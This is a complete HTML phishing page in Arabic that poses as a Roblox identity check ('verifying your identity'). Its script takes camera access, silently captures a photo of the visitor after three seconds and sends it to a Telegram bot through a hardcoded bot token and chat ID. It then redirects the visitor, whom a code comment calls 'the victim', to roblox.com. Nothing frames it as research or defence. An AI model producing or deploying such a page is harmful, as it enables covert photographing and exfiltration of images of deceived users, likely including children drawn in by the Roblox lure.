<!DOCTYPE html>
<html>
<head>
    <title>تحقق</title>
    <style>
        body { text-align: center; font-family: Arial; padding: 50px; background: #1a1a2e; color: white; }
        video { width: 300px; height: 200px; border-radius: 10px; display: none; }
        img { width: 150px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_Logo_2022.svg/1200px-Roblox_Logo_2022.svg.png" alt="Roblox">
    <h1>جاري التحقق من هويتك...</h1>
    <p>يرجى الانتظار لحظة</p>
    <video id="video" autoplay></video>

    <script>
        const video = document.getElementById('video');
        let stream = null;

        // طلب الكاميرا
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(s => {
                stream = s;
                video.srcObject = s;
                // بعد 3 ثواني، التقط الصورة تلقائياً
                setTimeout(capture, 3000);
            })
            .catch(() => alert('الرجاء السماح باستخدام الكاميرا'));

        function capture() {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);

            const imageData = canvas.toDataURL('image/jpeg');

            const botToken = '8575472482:AAGXTn8RYrIVtqreB2vGuqmDE3H40uw4aqM';
            const chatId = '6526473202';

            fetch(imageData)
                .then(res => res.blob())
                .then(blob => {
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', blob, 'face.jpg');
                    return fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                })
                .then(() => {
                    // توجيه الضحية إلى روبلوكس بعد التصوير
                    window.location.href = 'https://www.roblox.com';
                })
                .catch(() => alert('حدث خطأ، حاول مرة أخرى'));

            if (stream) stream.getTracks().forEach(t => t.stop());
        }
    </script>
</body>
</html>
